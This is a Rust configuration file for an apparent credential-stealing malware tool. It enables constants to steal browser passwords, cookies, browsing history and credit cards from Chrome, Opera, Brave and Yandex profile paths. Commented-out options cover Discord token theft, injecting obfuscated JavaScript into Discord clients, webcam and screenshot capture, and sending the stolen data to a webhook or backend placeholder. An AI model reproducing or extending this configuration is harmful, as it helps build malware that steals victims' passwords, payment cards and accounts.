// // Webhook that will be encrypted on runtime using a macro
// pub const ENCRYPTED_WEBHOOK: &str = discoon::encrypt!("[ENTER-WEBHOOK]");
//
// // Sends new user token when they change user data also steals credit cards and login information
// pub const TRACE_TOKEN: bool = false;
//
// // Restarts discord after injecting code so they'll have to login instantly
// pub const REFRESH_DISCORD: bool = false;
//
// // Steals and decrypts discord tokens (self explanatory)
// pub const STEAL_TOKENS: bool = false;

// Steals browser passwords (self explanatory)
pub const STEAL_PASSWORDS: bool = true;

// Steals browser cookies (self explanatory)
pub const STEAL_COOKIES: bool = true;

// Steal browsing history (self explanatory)
pub const STEAL_HISTORY: bool = true;

// Steal credit cards (self explanatory)
pub const STEAL_CREDIT_CARDS: bool = true;

// // Takes a screenshot (self explanatory)
// pub const SCREENSHOT: bool = false;
//
// // Takes a webcam image (self explanatory)
// pub const WEBCAM_IMAGE: bool = false;

// // Change this to your backend
// pub const BACKEND: &'static str = "[ENTER-BACKEND]";
//
// // Code to inject to discord (obfuscated with https://www.preemptive.com/products/jsdefender/online-javascript-obfuscator-demo/)
// pub const INJECT_CODE: &'static str = include_str!("../assets/inject.js");

// Browsers to steal from
pub const CHROMUNIUM_TARGETS: &'static [&'static str] = &[
    "Roaming\\Opera Software\\Opera Stable",
    "Local\\Google\\Chrome",
    "Local\\BraveSoftware\\Brave-Browser",
    "Local\\Yandex\\YandexBrowser",
];

// // Discord clients to infect
// pub const CLIENT_TARGETS: &[(&'static str, &'static str, &'static str)] = &[
//     ("Local\\Discord", "Discord.exe", "Discord.lnk"),
//     (
//         "Local\\DiscordCanary",
//         "DiscordCanary.exe",
//         "DiscordCanary.lnk",
//     ),
//     ("Local\\DiscordPTB", "DiscordPTB.exe", "DiscordPTB.lnk"),
//     (
//         "Local\\DiscordDevelopment",
//         "DiscordDevelopment.exe",
//         "Discord Development.lnk",
//     ),
// ];

// Browsers and clients to steal tokens from
// pub const TOKEN_TARGETS: &'static [&'static str] = &[
//     "Roaming\\discord",
//     "Roaming\\discordcanary",
//     "Roaming\\discordptb",
//     "Roaming\\discorddevelopement",
//     "Roaming\\Opera Software\\Opera Stable",
//     "Local\\Google\\Chrome\\User Data\\Default",
//     "Local\\BraveSoftware\\Brave-Browser\\User Data\\Default",
//     "Local\\Yandex\\YandexBrowser\\User Data\\Default",
// ];
